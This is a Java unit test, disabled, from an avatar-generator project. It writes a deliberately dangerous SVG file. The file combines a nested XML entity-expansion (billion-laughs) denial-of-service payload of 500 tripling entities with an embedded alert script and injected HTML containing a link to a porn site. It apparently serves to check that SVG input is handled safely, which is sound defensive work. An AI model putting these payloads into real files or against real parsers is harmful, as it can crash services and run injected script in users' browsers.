package com.xenoamess.xenoamess_avatar_generator;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

public class TestGenerateDangerousSvgs {

    @Disabled
    @Test
    public void generateXxeDos1() throws IOException {
        try (
                OutputStream outputStream = new FileOutputStream("target/generateXxeDos1.svg");
                OutputStreamWriter outputStreamWriter = new OutputStreamWriter(outputStream)
        ) {
            outputStreamWriter.write(
                    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                            "<!DOCTYPE xenoamess [\n" +
                            "  <!ENTITY atk1 \"jajajajajajajaja\">\n"
            );

            for (int i = 1; i < 500; i++) {
                outputStreamWriter.write(
                        "  <!ENTITY atk" + (i + 1) + " \"&atk" + i + ";&atk" + i + ";&atk" + i + ";\">\n"
                );
            }
            outputStreamWriter.write(
                    "]>\n"
            );

            outputStreamWriter.write(
                    "<svg xmlns=\"http://www.w3.org/2000/svg\" fill-opacity=\"1\" width=\"512\" height=\"512\" " +
                            "stroke-width=\"0\">\n" +
                            "    <defs id=\"xenoamess@gmail.com\"/>\n" +
                            "    <g transform=\"translate(256.0,256.0)\">\n" +
                            "        <circle cx=\"0\" cy=\"0\" r=\"256.0\" fill=\"#FFFFFF\"/>\n" +
                            "        <path d=\"M 0 0 79.10835055998656 -243.4704681715593 A 256.0 256.0 0 0 0 -79.10835055998662 " +
                            "-243.4704681715593Z\" fill=\"#FF0000\"/>\n" +
                            "        <path d=\"M 0 0 -171.2974352278677 -190.24507532221293 A 256.0 256.0 0 0 0 -250" +
                            ".40578578785423 -53.225392849346505Z\" fill=\"#000000\"/>\n" +
                            "        <path d=\"M 0 0 -250.40578578785428 53.22539284934619 A 256.0 256.0 0 0 0 -171" +
                            ".29743522786768 190.24507532221293Z\" fill=\"#FF0000\"/>\n" +
                            "        <path d=\"M 0 0 -79.10835055998659 243.4704681715593 A 256.0 256.0 0 0 0 79.10835055998648 " +
                            "243.47046817155933Z\" fill=\"#000000\"/>\n" +
                            "        <path d=\"M 0 0 171.29743522786777 190.24507532221287 A 256.0 256.0 0 0 0 250.40578578785426" +
                            " 53.22539284934631Z\" fill=\"#FF0000\"/>\n" +
                            "        <path d=\"M 0 0 250.4057857878542 -53.225392849346605 A 256.0 256.0 0 0 0 171.29743522786788" +
                            " -190.24507532221276Z\" fill=\"#000000\"/>\n" +
                            "        <circle cx=\"0\" cy=\"0\" r=\"128.0\" fill=\"#FFFFFF\"/>\n" +
                            "    </g>\n"
            );
            outputStreamWriter.write(
                    "   <script type=\"text/javascript\">\n" +
                            "       alert(\"hacked by XenoAmess 1\")\n" +
                            "   </script>\n" +
                            "   <foreignObject class=\"node\" x=\"0\" y=\"0\" width=\"500\" height=\"500\">\n" +
                            "       <body xmlns=\"http://www.w3.org/1999/xhtml\">\n" +
                            "           <a href=\"https://pornhub.com\">hacked by XenoAmess 4</a>\n" +
                            "           <h1>hacked by XenoAmess 5</h1>\n" +
                            "       </body>\n" +
                            "   </foreignObject>\n" +
                            "   <text x=\"0\" y=\"0\" font-size=\"20\">&atk500;</text>\n" +
                            "</svg>\n"
            );
        }
    }
}
